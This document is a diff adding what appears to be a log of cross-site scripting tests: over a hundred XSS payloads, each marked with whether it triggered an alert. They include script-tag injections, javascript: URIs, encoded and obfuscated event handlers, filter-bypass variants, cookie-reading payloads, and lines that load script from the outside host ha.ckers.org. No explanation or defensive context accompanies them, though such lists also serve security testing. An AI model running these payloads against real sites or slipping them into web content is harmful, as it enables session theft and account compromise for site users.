@@ -1,0 +1,116 @@
+Payload: <IMG SRC="javascript:alert('XSS')" | Alert: False
+Payload: </TITLE><SCRIPT>alert("XSS");</SCRIPT> | Alert: True
+Payload: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <BODY BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <IMG DYNSRC="javascript:alert('XSS')"> | Alert: False
+Payload: <IMG LOWSRC="javascript:alert('XSS')"> | Alert: False
+Payload: <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br> | Alert: False
+Payload: <BGSOUND SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <LINK REL="stylesheet" HREF="javascript:alert('XSS');"> | Alert: False
+Payload: <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet"> | Alert: False
+Payload: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> | Alert: False
+Payload: <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> | Alert: False
+Payload: <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> | Alert: False
+Payload: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> | Alert: False
+Payload: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"> | Alert: False
+Payload: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"> | Alert: False
+Payload: <IFRAME SRC="javascript:alert('XSS');"></IFRAME> | Alert: True
+Payload: <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> | Alert: False
+Payload: <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET> | Alert: False
+Payload: <TABLE BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <TABLE><TD BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <DIV STYLE="background-image: url(javascript:alert('XSS'))"> | Alert: False
+Payload: <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"> | Alert: False
+Payload: <BASE HREF="javascript:alert('XSS');//"> | Alert: False
+Payload: <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>"> | Alert: False
+Payload: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4- | Alert: False
+Payload: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <iframe  src="&Tab;javascript:prompt(1)&Tab;"> | Alert: True
+Payload: <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>' | Alert: False
+Payload: <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;" | Alert: False
+Payload: <sVg><scRipt >alert&lpar;1&rpar; {Opera} | Alert: False
+Payload: <img/src=`` onerror=this.onerror=confirm(1) | Alert: False
+Payload: <form><isindex formaction="javascript&colon;confirm(1)" | Alert: False
+Payload: &#34;&#62;<h1/onmouseover='\u0061lert(1)'> | Alert: False
+Payload: <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/> | Alert: False
+Payload: <meta http-equiv="refresh" content="0;url=javascript:confirm(1)"> | Alert: False
+Payload: <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> | Alert: True
+Payload: <form><a href="javascript:\u0061lert&#x28;1&#x29;">X | Alert: False
+Payload: </script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'> | Alert: True
+Payload: <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)> | Alert: True
+Payload: <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;> | Alert: True
+Payload: http://www.google<script .com>alert(document.location)</script | Alert: False
+Payload: <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a | Alert: False
+Payload: <img/src=@&#32;&#13; onerror = prompt('&#49;') | Alert: False
+Payload: <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41; | Alert: False
+Payload: </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-( | Alert: True
+Payload: &#00;</form><input type&#61;"date" onfocus="alert(1)"> | Alert: False
+Payload: <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'> | Alert: False
+Payload: <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a> | Alert: False
+Payload: <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN | Alert: False
+Payload: <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1) | Alert: False
+Payload: &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera} | Alert: False
+Payload: <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^ | Alert: False
+Payload: <iframe// src=javaSCRIPT&colon;alert(1) | Alert: False
+Payload: //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>// | Alert: False
+Payload: /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/> | Alert: True
+Payload: </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style> | Alert: False
+Payload: <a/href="javascript:&#13; javascript:prompt(1)"><input type="X"> | Alert: False
+Payload: </plaintext\></|\><plaintext/onmouseover=prompt(1) | Alert: False
+Payload: <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button> | Alert: False
+Payload: <div onmouseover='alert&lpar;1&rpar;'>DIV</div> | Alert: False
+Payload: <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"> | Alert: False
+Payload: <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a> | Alert: False
+Payload: <var onmouseover="prompt(1)">On Mouse Over</var> | Alert: False
+Payload: <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a> | Alert: False
+Payload: <img src="/" =_=" title="onerror='prompt(1)'"> | Alert: True
+Payload: <iframe/src \/\/onload = prompt(1) | Alert: False
+Payload: <iframe/onreadystatechange=alert(1) | Alert: False
+Payload: <svg/onload=alert(1) | Alert: False
+Payload: <input value=<><iframe/src=javascript:confirm(1) | Alert: False
+Payload: <input type="text" value=`` <div/onmouseover='alert(1)'>X</div> | Alert: False
+Payload: <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/> | Alert: False
+Payload: <svg contentScriptType=text/vbs><script>MsgBox+1 | Alert: False
+Payload: <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE> | Alert: False
+Payload: <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+ | Alert: False
+Payload: <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)> | Alert: False
+Payload: <script>+-+-1-+-+alert(1)</script> | Alert: True
+Payload: <img src ?itworksonchrome?\/onerror = alert(1) | Alert: False
+Payload: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe | Alert: False
+Payload: <div/onmouseover='alert(1)'> style="x:"> | Alert: False
+Payload: <--`<img/src=` onerror=alert(1)> --!> | Alert: True
+Payload: <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button> | Alert: True
+Payload: "><img src=x onerror=window.open('https://www.google.com/');> | Alert: False
+Payload: <form><button formaction=javascript&colon;alert(1)>CLICKME | Alert: False
+Payload: <script>alert('XSS');</script> | Alert: True
+Payload: <IMG SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC=javascript:alert('XSS')> | Alert: False
+Payload: <IMG SRC=javascript:alert('XSS')> | Alert: False
+Payload: <IMG SRC=javascript:alert(&quot;XSS&quot;)> | Alert: False
+Payload: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> | Alert: True
+Payload: <scr<script>ipt>alert('XSS');</scr</script>ipt> | Alert: False
+Payload: <script>alert(String.fromCharCode(88,83,83))</script> | Alert: True
+Payload: <img src=foo.png onerror=alert(/xssed/) /> | Alert: True
+Payload: <marquee><script>alert('XSS')</script></marquee> | Alert: True
+Payload: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> | Alert: False
+Payload: "><script>alert(0)</script> | Alert: True
+Payload: </title><script>alert(/xss/)</script> | Alert: True
+Payload: </textarea><script>alert(/xss/)</script> | Alert: True
+Payload: <IMG LOWSRC=\"javascript:alert('XSS')\"> | Alert: False
+Payload: <IMG DYNSRC=\"javascript:alert('XSS')\"> | Alert: False
+Payload: <font style='color:expression(alert(document.cookie))'> | Alert: False
+Payload: <img src="javascript:alert('XSS')"> | Alert: False
+Payload: <body onunload="javascript:alert('XSS');"> | Alert: False
+Payload: <body onLoad="alert('XSS');" | Alert: True
+Payload: [color=red' onmouseover="alert('xss')"]mouse over[/color] | Alert: False
+Payload: "/></a></><img src=1.gif onerror=alert(1)> | Alert: True
+Payload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"> | Alert: False
+Payload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"> | Alert: False
+Payload: <script>var var = 1; alert(var)</script> | Alert: False
+Payload: <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> | Alert: False
+Payload: <?='<SCRIPT>alert("XSS")</SCRIPT>'?> | Alert: False
+Payload: <FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET> | Alert: False
+Payload: <STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS | Alert: False
+Payload: </script><script>alert(1)</script> | Alert: True
+Payload: <BASE HREF="javascript:alert('XSS');//"> | Alert: False
+Payload: "></iframe><script>alert(123)</script> | Alert: True
